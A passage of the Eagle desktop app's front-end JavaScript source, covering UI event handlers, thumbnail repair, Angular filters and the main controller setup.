if (isDev) { resourcesPath = require("path").join(appRoot.path, '/build_files/'); }
else { resourcesPath = require("path").join(process.resourcesPath); }
const pluginModule = require(`${appRoot}/app/js/plugin`);
var fse;
var tinyPinyin;
var pinyinlite;
var readChunk;
var writeFileAtomic;
var cartesianProduct;
var sanitize;
var unicodeNormalize;
var chineseConvert;
var colorConvert;
var DeltaE;
var preferences;
var languageBCP = "en";
var applicationMenu;

var backgroundWindowID;
var osVersion = os.release() || "";
const isVentura = process.platform === 'darwin' && parseInt(osVersion) >= 22;
const isWin11 = process.platform === 'win32' && isWindows11();
var QuickAccessManager = {};
var ScrollbarSaver;
var fontFolder;
var showFinderAlert = true;
if (localStorage["eagle.hint.showInFinder"] === 'false') {
    showFinderAlert = false;
}
var windowMouseX = 0, windowMouseY = 0;
var isMouseMoving = false;
var heartbeatInterval;
var heartbeatStopCount = 0;
var hardDiskSpeed;
var remainShowImageCount = 0;
var SlowNotify = {
    hasShow: false,
    triggerCount: 24,
    resetCount: 4,
    slowCount: 0,
    fastCount: 0,
    calculate: function (loadSpeed) {
        if (!loadSpeed || SlowNotify.hasShow) return;
        if (loadSpeed > 5000) {
            SlowNotify.slowCount += 4;
        }
        else if (loadSpeed > 2500) {
            SlowNotify.slowCount += 2.5;
        }
        else if (loadSpeed > 2000) {
            SlowNotify.slowCount += 1.5;
        }
        else if (loadSpeed >= 1500) {
            SlowNotify.slowCount += 1;
        }

        if (loadSpeed <= 300) {
            SlowNotify.fastCount += 2;
        }
        else if (loadSpeed <= 500) {
            SlowNotify.fastCount += 1;
        }
        else if (loadSpeed <= 700) {
            SlowNotify.fastCount += 0.5;
        }
        else {
            SlowNotify.fastCount = 0;
        }
        // console.log(`SlowNotify.slowCount: ${SlowNotify.slowCount}, SlowNotify.fastCount: ${SlowNotify.fastCount}`)
        SlowNotify.detect();
    },
    detect: function () {
        if (SlowNotify.fastCount >= SlowNotify.resetCount) {
            SlowNotify.fastCount = 0;
            SlowNotify.slowCount = 0;
            // console.log("重置")
        }
        if (SlowNotify.slowCount >= SlowNotify.triggerCount) {
            SlowNotify.show();
        }
    },
    show: function () {
        $bodyScope.showSlowNotify = true;
        $bodyScope.$evalAsync(function () {
            setTimeout(function () {
                $("#library-warning").addClass("show active");
                setTimeout(function () {
                    $("#library-warning").removeClass("active");
                }, 10000);
            }, 300);
        });
        SlowNotify.hasShow = true;
        console.log("跳出提示");
        electronLog && electronLog.error(`[app] Warning: hard drive performance too slow`);
    }
};

try {
	if (isPackaged) {
	    var methods = ["dir", "log", "time", "timeEnd", "error", "info"];
	    for (var i = 0; i < methods.length; i++) {
	        console[methods[i]] = function(){};
	    }
	}
}
catch (err) {
	
}

function checkBackgroundHeartbeat () {
    // 理论上不该被呼叫，如果被呼叫 N 次，很有可能后台已经崩溃了，应在前台进行提示
    try {
        heartbeatStopCount++;
        if (heartbeatStopCount >= 30) {
            electronLog.error(`[app] The background process does not respond for more than 180 seconds`);
            clearInterval(heartbeatInterval);
            swal({
                html: `
                    <div class="alert">
                        <div class="alert-icon error"></div>
                        <h4 class="alert-title">${i18n.__("dialog.bgcrash.title")}</h4>
                        <p class="alert-desc">${i18n.__("dialog.bgcrash.desc")}</p>
                    </div>
                `,
                showCloseButton: false, showCancelButton: true, allowOutsideClick: false, focusConfirm: true, focusCancel: false, padding: 24,
                width: 400,
                customClass: "alert-box",
                cancelButtonColor: "#777777",
                confirmButtonText: i18n.__("dialog.bgcrash.btn1"),
                cancelButtonText: i18n.__("dialog.bgcrash.btn2"),
            }).then(function () {
                electronLog.error(`[app] The background process does not respond, user click retry btn`);
                heartbeatStopCount-= 5;
                heartbeatInterval = setInterval(checkBackgroundHeartbeat, 10000);
            }, function () {
                ipcRenderer.send("save-cache-file");
                if (currentWindow && !currentWindow.isDestroyed()) {
                    currentWindow.hide();
                }
                setTimeout(function () {
                    app.relaunch();
                    app.exit(0);
                }, 3000);
            });
        }
        else {
            electronLog.error(`[app] The background process does not respond for more than ${heartbeatStopCount * 10} seconds`);
        }
    }
    catch (err) {}
}

window.shell = shell;

console.timeEnd("Load module");

if (process.platform === 'darwin') {
    fontFolder = `${app.getPath("home")}/library/Fonts/EagleApp/`;
}
else {
    fontFolder = `${process.env.SYSTEMROOT}/Fonts/`;
}

electronLog.transports.file.appName = 'Eagle';
electronLog.transports.file.level = 'info';
electronLog.transports.file.maxSize = 20 * 1024 * 1024;

electronLog.info("[app] App start");

var machineID;
var Registration = {
	activated: false
}

process.on('unhandledRejection', (reason, p) => {
    // 记录日志、抛出错误、或其他逻辑。
    console.log('未处理的 rejection：', p, '原因：', reason);
});

process.on('uncaughtException', function (err) {
    // console.error(err);
    electronLog && electronLog.error("[app] " + err.stack || err);

    // 将错误发送至 google 分析
    if (analytics.errorTracking && err.stack) {
        setTimeout(() => {
            analytics.exception("" + err.stack);
        }, 0);
    }
});


window.onbeforeunload = function(event) {
    stopAPIServer && stopAPIServer();
    $bodyScope.SavedFilter.unwatch();
    Actions.unwatch();
};

window.onerror = function (msg, url, lineNo, columnNo, err) {
    try {
        electronLog && electronLog.error("[app] " + err.stack || err);
    }
    catch (err) {}
};

var installedFonts = {};
fs.access(fontFolder, function (err) {
    if (!err) {
        fs.readdir(fontFolder, function (err, files) {
            if (err) return;
            try {
                files.forEach(function (file) {
                    var extname = path.extname(file).toLowerCase();
                    var name = path.basename(file, extname);
                    var key = `${name}_${extname}`;
                    installedFonts[key] = true;
                });
            }
            catch (err) {}
            // console.log(installedFonts);
        });
    }
});

// 所有帶有 target _blank 的連結都會使用預設瀏覽器開啟
$("body").on('click', 'a', function(event) {
    event && event.preventDefault();
    var link = this.href;
    if ($(this).attr("target") == "_blank") {
        if (preferences && preferences.general && preferences.general.language) {
            switch (preferences.general.language) {
                case 'zh_CN':
                    link = link.replace("https://eagle.cool/", "https://cn.eagle.cool/");
                    break;
                case 'zh_TW':
                    link = link.replace("https://eagle.cool/", "https://tw.eagle.cool/");
                    break;
                case 'en':
                    link = link.replace("https://eagle.cool/", "https://en.eagle.cool/");
                    break;
            }
        }
        shell.openExternal(link);
        if (this.href.indexOf('/extensions')) {
            var label = $(this).attr('label') || "";
        }
    }
    else if (link.indexOf("eagle://") > -1) {
    	ipcRenderer.send("open-url", link);
    }
});

$("body").on('input', "input.range", debounce(function () {
    $(this).blur();
}, 50));

$("body").on('keydown', ".swal2-container textarea", function (event) {
	var keyCode = event.keyCode;
	if (keyCode === 13) { 
		if (!event.metaKey && !event.ctrlKey) {
			event.stopPropagation();
		}
    }
});

$("body").on('blur', ".swal2-container textarea", function () {
    $(".swal2-container").addClass("blur");
});

$("body").on('focus', ".swal2-container textarea", function () {
    $(".swal2-container").removeClass("blur");
});

$("body").on('keydown', 'input, textarea', function(event) {
    var keyCode = event.keyCode;
    if (keyCode == 65 && (event.ctrlKey || event.metaKey)) {
        $(this).select();
    }
});

$("body").on('keydown', '.import-modal input, .modal input, .modal textarea', function(event) {
    var keyCode = event.keyCode;
    if (keyCode == 9) {
    	event && event.stopPropagation();
    	event && event.preventDefault();
    	var $modal = $(".modal").has(this);
    	var $inputs = $modal.find("input:visible, textarea:visible");
    	var focusIndex = 0;
    	$inputs.each(function (index) {
    		var $input = $(this);
    		if ($input.is(':focus')) {
    			focusIndex = index;
    		}
    	});
    	if (event.shiftKey) {
    		if (focusIndex === 0) { focusIndex = $inputs.length -1; }
    		else { focusIndex--; }
    	}
    	else {
    		if (focusIndex === $inputs.length - 1) { focusIndex = 0; }
    		else { focusIndex++; }
		}
		$inputs.eq(focusIndex).focus();
    }
});

var scrollSidebarInterval;
var scrollSidebarSpeed = 6;
$("body").on('mouseenter', '.sidebar-scroll-helper.top', function (event) {
    var $container = $("#sidebar-item-container");
    scrollSidebarInterval = setInterval(function () {
        $container.scrollTop($container.scrollTop() - scrollSidebarSpeed);
        scrollSidebarSpeed += 0.1;
        if (scrollSidebarSpeed > 40) scrollSidebarSpeed = 40;
    }, 20);
});

$("body").on('mouseenter', '.sidebar-scroll-helper.bottom', function (event) {
    var $container = $("#sidebar-item-container");
    scrollSidebarInterval = setInterval(function () {
        $container.scrollTop($container.scrollTop() + scrollSidebarSpeed);
        scrollSidebarSpeed += 0.1;
        if (scrollSidebarSpeed > 40) scrollSidebarSpeed = 40;
    }, 20);
});

$("body").on('mouseleave', '.sidebar-scroll-helper', function (event) {
    scrollSidebarSpeed = 6;
    clearInterval(scrollSidebarInterval);
});

// 双击列表标签
$("#box-container").on('dblclick', '.box .metas .tag, .box .prop .tag', function (event) {
    let $scope = angular.element("body").scope();
    let tag = $(this).text();
    $scope.TagManager.filterWithTags([tag]);
    $scope.$evalAsync();
});

// GIF 旋停自动播放
$("#box-container").on('mouseover', '.box.gif .thumbnail', function(event) {
    if (event.altKey) return;
    if ($bodyScope.preferences.habits.alwaysPlayGIF === "on") return;
    var $scope = angular.element("body").scope();
    var $box = $(".box").has(this);
    var image = $scope.getItemByElement($box[0]);

    if (!image) return;

    var rawPath = $bodyScope.getRawUrl(image);
    var $img = $(this).find("img");
    var $label = $(this).find(".type-label");
    var currentSrc = $img.attr("src");
    if (currentSrc != rawPath) {
        $img.attr("src", rawPath);
        $label.css("opacity", 0);
    }
});

$("#box-container").on('mouseleave', '.box.gif .thumbnail', function(event) {
    if ($bodyScope.preferences.habits.alwaysPlayGIF === "on") return;
    var $scope = angular.element("body").scope();
    var $box = $(".box").has(this);
    var image = $scope.getItemByElement($box[0]);
    var thumbnailPath = FileUrlHelper.getLastestThumbnailUrl(image);
    var $img = $(this).find("img");
    var $label = $(this).find(".type-label");
    var currentSrc = $img.attr("src");
    if (currentSrc != thumbnailPath) {
        $img.attr("src", thumbnailPath);
        $label.css("opacity", 1);
    }
});

// WebP 旋停自动播放
$("#box-container").on('mouseover', '.box.webp .thumbnail', function(event) {
    if ($bodyScope.preferences.habits.alwaysPlayGIF === "on") return;
    var $scope = angular.element("body").scope();
    var $box = $(".box").has(this);
    var image = $scope.getItemByElement($box[0]);

    if (!image || !image.animated) return;

    var rawPath = $bodyScope.getRawUrl(image);
    var $img = $(this).find("img");
    var $label = $(this).find(".type-label");
    var currentSrc = $img.attr("src");
    if (currentSrc != rawPath) {
        $img.attr("src", rawPath);
        $label.css("opacity", 0);
    }
});

$("#box-container").on('mouseleave', '.box.webp .thumbnail', function(event) {
    if ($bodyScope.preferences.habits.alwaysPlayGIF === "on") return;
    var $scope = angular.element("body").scope();
    var $box = $(".box").has(this);
    var image = $scope.getItemByElement($box[0]);

    if (!image || !image.animated) return;

    var thumbnailPath = FileUrlHelper.getThumbnailUrl(image);
    var $img = $(this).find("img");
    var $label = $(this).find(".type-label");
    var currentSrc = $img.attr("src");
    if (currentSrc != thumbnailPath) {
        $img.attr("src", thumbnailPath);
        $label.css("opacity", 1);
    }
});

// NOTE: 当缩略图无法正常显示时，应避免画面破损，并提示用户缩略图消失可能的原因，让用户不需要用过度担忧
function listImageError (event) {
    if (event && event.target) {
        // Note 這個判斷很重要，目前已知可能因為 src 是空的出錯，這種情況不需要進行任何判斷
        if (event.target.currentSrc === "") return;
        var $target = $(event.target);
        event.target.onerror = null;
        $target.attr("alt", "");
        $target.css("height", "100%");

        var $box = $target.parent().parent();
        var item = $bodyScope.getItemByElement($box[0]);
        var thumbPath = FileUrlHelper.getThumbnailPath(item);

        if (thumbPath.length >= 260) {
            $target.parent().addClass("dummy");
            tippy($target.parent()[0], {
                animation: 'scale',
                arrow: false,
                content: i18n.__("hint.pathTooLong"),
                placement: 'bottom'
            });
        }
        else {
            $target.parent().addClass("dummy");
            tippy($target.parent()[0], {
                animation: 'scale',
                arrow: false,
                content: i18n.__("hint.thumbnailMissing"),
                placement: 'bottom'
            });
        }
        tryToFixThumbnailError(item, $target);
    }
};

function tryToFixThumbnailError (item, $target) {

	if (!item) {
        let $box = $(".box").has($target);
        if ($box.length > 0) {
            ig.remove($box[0]);
            ig.layout(true);
        }
        return;
    }

	try {
		var imageDir = decodeURIComponent($bodyScope.imagesDir);
		var rawPath = FileUrlHelper.getRawPath(item);

		// 当原文件不存在
		if (!fs.existsSync(rawPath)) {
			// 可能是源文件名和软件记录不一致
			// 检查路径下是否有其他文件
			fixThumbnail(item, $target);
		}
		else {
			// let stat = fs.statSync(rawPath);
			// if (stat.size === 0) {
				// hideElement(item, $target);
			// }
			// else {
				// 如果不是源文件异常，那么就需要尝试修复缩略图，无论如何，不隐藏元件
				fixThumbnail(item, $target);
			// }
		}
	}
	catch (err) {
		
	}


	// 隐藏元件
	function hideElement (item, $target) {

		if (!item || !item.id) return;

		electronLog && electronLog.error(`[app] File does not exist, hidden file: ${item.name} (${item.id}) `);

		var box = $(`#box-${item.id}`)[0];
		if (box) {
			ig.remove(box);
			$(window).trigger('resize');
			// ig.layout(true);
		}

		var idx = $bodyScope.allData.indexOf(item);
		$bodyScope.allData.splice(idx, 1);
        // 將 item mapping 移除，這時候如果使用者使用 fixUtils 清除無效內容，就可以刪除到
        // delete $bodyScope.itemMappings[item.id];
		$bodyScope.$evalAsync();
	}

	function renewThubnail (item, $target) {
		var newSrc = FileUrlHelper.getThumbnailUrl(item) + "?v=" + Date.now();
        $target.attr("src", newSrc);
        $target.attr("lazysrc", newSrc);
	}

	// 修复缩略图功能
	function fixThumbnail (item, $target) {

		// var imageDir = decodeURIComponent($bodyScope.imagesDir);
		var infoPath = `${imageDir}/${item.id}.info/`;
		var rawPath = FileUrlHelper.getRawPath(item);
		var thumbnailPath = FileUrlHelper.getThumbnailPath(item);

		// var files = fs.readdirSync(infoPath);
        fs.readdir(infoPath, function (err, files) {

            if (!files) return;

            var rawFile = `${item.name}.${item.ext}`;

            if (!fs.existsSync(rawPath)) {
                var rawFiles = files.filter(function (file) {
                    return !file.endsWith("_thumbnail.png") && file.indexOf("metadata") === -1 && file.indexOf("DS_Store") === -1 && file.indexOf(item.ext) > -1
                });
                rawFile = rawFiles[0];
            }
            
            var thumbnails = files.filter(function (file) {
                return file.indexOf("_thumbnail.png") > -1;
            });


            if (rawFile) {

                // 新的文件名以最后修改时间为主，一律采用最新时间的名称
                var rawFileName = rawFile.split('.').slice(0, -1).join('.');
                var newFileName;
                try {
                    var rawStat = fs.statSync(`${infoPath}/${rawFile}`);
                    if (rawStat.mtimeMs && item.modificationTime && rawStat.mtimeMs < item.modificationTime) {
                        newFileName = item.name;
                    }
                    else {
                        newFileName = rawFileName;
                    }
                }
                catch (err) {
                    newFileName = rawFileName;
                }

                const unrom = require(appRoot.path + '/app/js/utils/unorm.js');
                const nfcRawFileName = unrom.nfc(rawFileName);
                // 實際檔案名稱使用 NFD 編碼，但是在檔案系統中，檔案名稱是 NFC 編碼，因此需要進行改名
                if (nfcRawFileName !== rawFileName && nfcRawFileName === item.name) {
                    try {
                        electronLog.info(`[app] Fix nfc/nfd file: ${infoPath}/${rawFile}`);
                        fs.renameSync(`${infoPath}/${rawFile}`, `${infoPath}/${nfcRawFileName}.${item.ext}`);
                        $bodyScope.updateItemView(item);
                        renewThubnail(item, $target);
                        ayncsImagesChange([item]);
                    }
                    catch (err) {
                        electronLog.error(`[app] Fix nfc/nfd file failed: ${err}`);
                    }
                }

                var itemName = item.name;

                // 修改应用端记录的名称
                if (rawFileName !== itemName || itemName !== _.unescape(itemName) || itemName.length > EagleConfig.MAX_FILENAME_LENGTH) {
                    if (
                        newFileName !== decodeURIComponent(newFileName) ||
                        newFileName !== _.unescape(newFileName) || 
                        itemName.length > EagleConfig.MAX_FILENAME_LENGTH
                    ) {
                        item.name = sanitize( _.unescape( decodeURIComponent(newFileName) ) ).replace("://", "");
                        item.name = item.name.substr(0, EagleConfig.MAX_FILENAME_LENGTH);

                        var finalPath = path.normalize(`${infoPath}/${item.name}.${item.ext}`);
                        try {
                            fs.renameSync(`${infoPath}/${rawFile}`, finalPath);
                            $bodyScope.updateItemView(item);
                            renewThubnail(item, $target);
                            ayncsImagesChange([item]);
                        }
                        catch (err) {
                            item.name = itemName;
                        }
                        electronLog.info(`[app] Thumbnail file missed, beacause file name is inconsistent[0]: ${rawFileName}`);
                    }
                    else {
                        item.name = newFileName;
                        $bodyScope.updateItemView(item);
                        renewThubnail(item, $target);
                        ayncsImagesChange([item]);
                    }
                }

                // 如果此文件有缩略图，一并修改或制作缩略图
                if (!item.noThumbnail) {
                    if (!fs.existsSync(thumbnailPath)) {
                        var renameThumbnailSuccess = false;
                        // 确保源文件名不会刚好是 _thumbnail.png，就可以将原来缩略图删除
                        if (newFileName.indexOf("_thumbnail.png") === -1) {
                            thumbnails.forEach(function (thumbnailName) {
                                if (thumbnailName.endsWith("_thumbnail.png")) {
                                    try { fse.renameSync(`${infoPath}/${thumbnailName}`, `${infoPath}/${newFileName}_thumbnail.png`); renameThumbnailSuccess = true; }
                                    catch (err) { renameThumbnailSuccess = false; }
                                }
                                else {
                                    try { fse.removeSync(`${infoPath}/${thumbnailName}`); }
                                    catch (err) {}
                                }
                            });
                        }
                        if (!renameThumbnailSuccess) {
                            ipcRenderer.send('regenerate-thumbnail', [item]);
                            electronLog.info(`[app] Thumbnail file missed, regenerate new thumbnail: ${infoPath}`);
                        }
                        else {
                            $bodyScope.updateItemView(item);
                            renewThubnail(item, $target);
                        }
                    }
                }
            }
            else {
                hideElement(item);
            }
        });
	}
}

$("#box-container").on("mousewheel.zoomming", function (e) {
    if (e.altKey || e.ctrlKey) {
        e.preventDefault();
        e.stopPropagation();
    }
});

$("#box-container").on("mousewheel.zoomming", throttle(function(e) {
    if (e.altKey || e.ctrlKey) {
        e.preventDefault();
        e.stopPropagation();
        if (e.originalEvent.wheelDelta > 0) {
            $bodyScope.zoomIn();
        }
        else {
            $bodyScope.zoomOut();
        }
        $bodyScope.$evalAsync();
        return false;
    }

}, 120, true));

$(document).ready(function() {

    ipcRenderer.send("update-main-window-id");

	document.addEventListener('keydown', event => {
		if (event.metaKey && event.shiftKey && event.keyCode === 73) {
			event.preventDefault();
			return false;
		}
		if (event.metaKey && event.altKey && event.keyCode === 73) {
			event.preventDefault();
			return false;
		}
	});
});

var EagleApp = angular.module("EagleApp", [
    'angular.bind.notifier',
    'mgo-mousetrap',
    'ui.sortable',
    'contenteditable',
    'angular-flatpickr',
    'cgNotify',
    'ya.nouislider',
    'vs-repeat',
    'shortcutInput',
    'mediaElement',
    'contextMenu',
    'tifImg',
	'pluginView',
    'inspectorPluginView',
    'tippy'
]);

EagleApp.filter('numberFixedLen', function() {
    return function(a, b) {
        var d = a.toString().length;
        var max = Math.max(d, b);
        return (1e9 + "" + a).slice(-max);
    };
});

EagleApp.filter('noZero', function () {
    return function (number) {
        if (number == '0') {
            return '';
        }
        return number;
    };
});

EagleApp.filter('longTitle', function () {
    return function (name) {
        if (name && name.length > 12) {
            return name;
        }
        return '';
    };
});

EagleApp.filter('unique', function() {

    return function(items, filterOn) {

        if (filterOn === false) {
            return items;
        }

        if ((filterOn || angular.isUndefined(filterOn)) && angular.isArray(items)) {
            var hashCheck = {},
                newItems = [];

            var extractValueToCompare = function(item) {
                if (angular.isObject(item) && angular.isString(filterOn)) {
                    return item[filterOn];
                } else {
                    return item;
                }
            };

            angular.forEach(items, function(item) {
                var valueToCheck, isDuplicate = false;

                for (var i = 0; i < newItems.length; i++) {
                    if (angular.equals(extractValueToCompare(newItems[i]), extractValueToCompare(item))) {
                        isDuplicate = true;
                        break;
                    }
                }
                if (!isDuplicate) {
                    newItems.push(item);
                }

            });
            items = newItems;
        }
        return items;
    };
});

EagleApp.filter('encodeHash', function($window) {
    return function(url) {
        if (url) return url.replace(/#/g, '%23');
        return url;
    }
});

EagleApp.filter('second2time', function() {
    return function(second) {
        if (second > 0) {
            var sec_num = parseInt(second, 10); // don't forget the second param
            var hours = Math.floor(sec_num / 3600);
            var minutes = Math.floor((sec_num - (hours * 3600)) / 60);
            var seconds = sec_num - (hours * 3600) - (minutes * 60);

            if (hours < 10) { hours = "" + hours; }
            if (minutes < 10) { minutes = "0" + minutes; }
            if (seconds < 10) { seconds = "0" + seconds; }

            if (hours && minutes) {
                return hours + ':' + minutes + ':' + seconds;
            }
            else if (!hours && minutes) {
                return minutes + ':' + seconds;
            }
            else if (!hours && !minutes) {
                return seconds;
            }
        }
        return "";
    };
});

EagleApp.filter('duration', function() {
    return function(str) {
        try {
            if (str) {
                var date = new Date(null);
                var seconds = Math.max(1, parseInt(str));
                date.setSeconds(seconds);
                if (seconds < 3600) {
                    return date.toISOString().substr(14, 5);
                }
                else {
                    return date.toISOString().substr(11, 8);
                }
            }
        }
        catch (err) {}
        return "";
    };
});

EagleApp.filter('domainName', function($window) {
    return function(url) {
    	if (!url) return "";
        var a = document.createElement('a');
        a.href = url;
        return a.hostname.toLowerCase();
    }
});

EagleApp.filter('fuzzyMatch', function($window) {
    return function(keyword, string) {
        if (!string) {
            return keyword;
        }
        var result = fuzzy_match(keyword, string);
        if (!result) return keyword;
        return result;
    };
});

EagleApp.filter('encodeURIComponent', function($window) {
    return function(url) {
        if (process.platform == 'darwin') {
            return encodeURIComponent(url);
        }
        return encodeURIComponent(url);
    }
});

EagleApp.filter('encodeURIComponentUrl', function($window) {
    return function(url) {
        var a = $window.encodeURIComponent(url);
        var b = a.replace(/\(/g, "\\(").replace(/\)/g, "\\)");
        return b;
    }
});

EagleApp.filter('i18n', function($window) {
    return function(key, pairs) {
        var i18nString = i18n.__(key);
        if (pairs) {
            pairs.forEach(function(pair) {
                i18nString = i18nString.replace("{" + pair.property + "}", pair.value);
            })
        }
        return i18nString;
    };
});

EagleApp.filter('mod', function($window) {
    return function(key) {
        if (process.platform != 'darwin') {
            return 'Ctrl';
        } else {
            return '⌘';
        }
    }
});

EagleApp.filter('thumbnailExt', function() {
    return function(ext) {
        if (ext === "svg") {
            return "svg";
        }
        return "png";
    };
});

EagleApp.config(function($sceProvider, $httpProvider) {
    $sceProvider.enabled(false);
});

// console.time("Angular 初始化");
EagleApp.controller('RootController', function($rootScope, $scope, $filter, $timeout, notify) {
// console.timeEnd("Angular 初始化");
	ipcRenderer.on('app-expired', function (e) {
    	$("body").css({
    		"pointer-events": "none",
    		"opacity": "0.3"
    	});
    });

    preferences = electronSettings.getSync('preferences');

    pluginModule.initIPC();
    pluginModule.init().then(() => {
        eagle.inspector.initPlugins();
    });
    setTimeout(() => {
        pluginModule.checkAllDependencies();    
    }, 2000);

    electron.webFrame.setZoomFactor(parseInt(preferences.general.zoom) / 100);
    $scope.colorSpace = electronSettings.getSync('colorSpace') || "Unmanaged";
    $scope.theme = preferences.theme.css || "gray";
	
    if (preferences && preferences.theme.name === 'Auto') {
        if (remote.nativeTheme.shouldUseDarkColors) {
            $scope.theme = "gray";
        }
        else {
            $scope.theme = "light";
        }
    }

    $scope.language = preferences.general.language || "en";
    languageBCP = $scope.language.replace("_", "-");

    $rootScope.preferences = preferences;
    $rootScope.isAppLocked = false;

    if (preferences.privacy.enable !== 'false') {
        $rootScope.isAppLocked = true;
    }

    // $rootScope.$broadcast('$$rebind::refreshTheme');

    // $scope.theme = "dark";
    // ipcRenderer.send('init-library');
    $scope.platform = process.platform;
    $scope.appVersion = appVersion;
    $scope.buildVersion = buildVersion;
    $scope.vibrancyEnabled = preferences?.general?.enableVibrancy !== 'false';
    $scope.isWin11 = isWin11;
    $scope.downloadProgress = 0;
    $scope.updateTransferred = 0;
    $scope.timeLeftInSeconds = -1;
    $scope.supportRotate = true;
    $scope.supportCrop = true;

    ipcRenderer.on('change.current.theme', function(e, theme) {
        if (theme.name === "Auto") {
            if (remote.nativeTheme.shouldUseDarkColors) {
                $scope.theme = "gray";
            }
            else {
                $scope.theme = "light";
            }
        }
        else {
            $scope.theme = theme.css || "gray";
        }
        // $rootScope.$broadcast('$$rebind::refreshTheme');
        $scope.$evalAsync();
    });

    ipcRenderer.on('change.zoom', function(e, zoom) {
        electron.webFrame.setZoomFactor(parseInt(zoom) / 100);
    });

    $scope.openRegisterModal = function () {
        ipcRenderer.send('open-registration', 'REGISTER');
    };

    $scope.openTrialModal = function (trialRemain) {
    	if (trialRemain) {
			ipcRenderer.send('open-trial-modal', trialRemain);
		}
    };

    $scope.toggleAlwaysOnTop = function () {
        $scope.isAlwaysOnTop = !$scope.isAlwaysOnTop;
        if ($scope.isAlwaysOnTop) {
            currentWindow.setAlwaysOnTop(true, "pop-up-menu");
            electronLog && electronLog.info("[app] Always on top: ON");
        }
        else {
            currentWindow.setAlwaysOnTop(false);
            electronLog && electronLog.info("[app] Always on top: OFF");
        }
    };

    const InputMenu = Menu.buildFromTemplate([{
        label: $filter('i18n')('appmenu.edit>cut'),
        role: 'cut',
    }, {
        label: $filter('i18n')('appmenu.edit>copy'),
        role: 'copy',
    }, {
        label: $filter('i18n')('appmenu.edit>paste'),
        role: 'paste',
    }, {
        type: 'separator',
    }, {
        label: $filter('i18n')('appmenu.edit>selectAll'),
        role: 'selectall',
    }]);

    document.body.addEventListener('contextmenu', (e) => {
        e.preventDefault();
        e.stopPropagation();

        let node = e.target;

        while (node) {
            if (node.nodeName.match(/^(input|textarea)$/i) || node.isContentEditable) {
                InputMenu.popup(remote.getCurrentWindow());
                break;
            }
            node = node.parentNode;
        }
    });

    $rootScope.undo = function() {};

    $rootScope.closeAll = function() {
        notify.closeAll();
    };

    var undoTimeout;
    $rootScope.notify = function(params, restoreCallbackk) {

        if (!params.message) return;

        var messageTemplate = `<span><icon class="${params.status || ''}"></icon>` + params.message;

        if (restoreCallbackk) {
            messageTemplate = messageTemplate + ' <a style="margin-left: 10px;" ng-click="closeAll();undo();">' + $filter('i18n')("notify.button.undo") + '</a></span>';
        } else {
            messageTemplate = messageTemplate + '</span>';
        }

        notify.closeAll();
        $timeout(function() {
            var duration = params.duration || 4000;
            notify({
                duration: duration,
                messageTemplate: messageTemplate,
                classes: [],
                scope: $rootScope,
                templateUrl: '',
                position: 'center',
            });
            if (restoreCallbackk) {
                $rootScope.undo = restoreCallbackk;
            } else {
                $rootScope.undo = function() {};
            }
            // 如果使用者超過時間沒有點擊反悔，就把 callback 移除，避免發生錯亂
            clearTimeout(undoTimeout);
            undoTimeout = setTimeout(function () {
                $rootScope.undo = function() {};
            }, duration + 5000);

        }, 10);
    };

    // console.timeEnd("RootController 初始化");
});

EagleApp.controller('EagleController', ['$rootScope', '$scope', '$http', '$timeout', '$filter', 'notify',
    function($rootScope, $scope, $http, $timeout, $filter, notify) {

        console.timeEnd("main:ready");
        $scope.DISABLE_ZOOM_TYPES = DISABLE_ZOOM_TYPES;
        $scope.VIDEO_TYPES = VIDEO_TYPES;
        $scope.AUDIO_TYPES = AUDIO_TYPES;
		$scope.MODEL_TYPES = MODEL_TYPES;
        $scope.FONT_TYPES = FONT_TYPES;
        $scope.URL_TYPES = URL_TYPES;
		$scope.pluginModule = pluginModule;
        $scope.SUPPORT_FORMATS = EagleConfig.SUPPORT_FORMATS;

        // 使用鼠标快捷键控制
        var eventMethod = window.addEventListener ?
            "addEventListener" :
            "attachEvent";
        var eventer = window[eventMethod];
        var messageEvent = eventMethod === "attachEvent" ?
            "onmessage" :
            "message";
        eventer(messageEvent, function(e) {

            if (e.data === "Exit" || e.message === "Exit") {
                $scope.leaveDetailMode();
                $scope.$evalAsync();
            } else if (e.data === "Prev" || e.message === "Prev") {
                $scope.selectPrev();
                $scope.$evalAsync();
            } else if (e.data === "Next" || e.message === "Next") {
                $scope.selectNext();
                $scope.$evalAsync();
            }

        });

        $scope.removeSound = {
            play: function () {
                $.playSound('sounds/remove.wav');
            }
        };

        $scope.duplicateSound = {
            play: function () {
                $.playSound('sounds/duplicate.wav');
            }
        };

        $scope.errorSound = {
            play: function () {
                $.playSound('sounds/error.wav');
            }
        };

        $scope.showTutorial = () => {
            if ($scope.all.length === 0 && $scope.libraryHistory.length === 1 && $scope.folders.length === 0) {
                if (localStorage["eagle.show.tutorial"] !== "true") {
                    const theme = $filter('themePath')($scope.theme);
                    
                    swal({
                        html: `
                            <div class="alert">
                                <div class="alert-image">
                                    <img width="384" height="216" src="assets/images/${theme}/illustrations/illustration-tutorial-${$scope.platform}.png" style="width: calc(100% + 32px);margin-bottom: 12px;aspect-ratio: 768/432;margin-left: -16px;margin-right: -16px;margin-top: -16px;">
                                </div>
                                <h4 class="alert-title">${i18n.__('dialog.tutorial.title')}</h4>
                                <p class="alert-desc">${i18n.__('dialog.tutorial.desc')}</p>
                            </div>
                        `,
                        showCloseButton: false, showCancelButton: true, allowOutsideClick: false, focusConfirm: true, focusCancel: false, padding: 24,
                        width: 400,
                        customClass: "tutorial-modal",
                        cancelButtonColor: "#777777",
                        confirmButtonText: i18n.__('dialog.tutorial.open'),
                        cancelButtonText: i18n.__('dialog.tutorial.later'),
                    }).then(function(result) {
                        localStorage.setItem("eagle.show.tutorial", "true");
                        switch (preferences.general.language) {
                            case 'zh_CN':
                                electron.shell.openExternal('https://docs-cn.eagle.cool/article/167-tutorial-1-overview-of-library-and-interface')
                                break;
                            case 'zh_TW':
                                electron.shell.openExternal('https://docs-tw.eagle.cool/article/288-tutorial-1-overview-of-library-and-interface')
                                break;
                            case 'ja_JP':
                                electron.shell.openExternal('https://docs-jp.eagle.cool/article/1043-tutorial-1-overview-of-library-and-interface')
                                break;
                            default:
                                electron.shell.openExternal('https://docs-en.eagle.cool/article/266-tutorial-1-overview-of-library-and-interface')
                        }
                    });
                    
                }
            }
        };


        var showImagesTimeout;
        var doScrollTimeout;
        var $scrollTopButton = $("#scroll-to-top");
        $boxContainer = $("#box-container");
        $boxContainer.on("scroll", function(event) {
            var delay = 100;
            if (hardDiskSpeed === "fast") delay = 70;
            clearTimeout(showImagesTimeout);
            clearTimeout(doScrollTimeout);
            clearTimeout(HoverPreview.zoomBtnTimeout);
            if (HoverPreview.isShow) {
                HoverPreview.hide();
            }
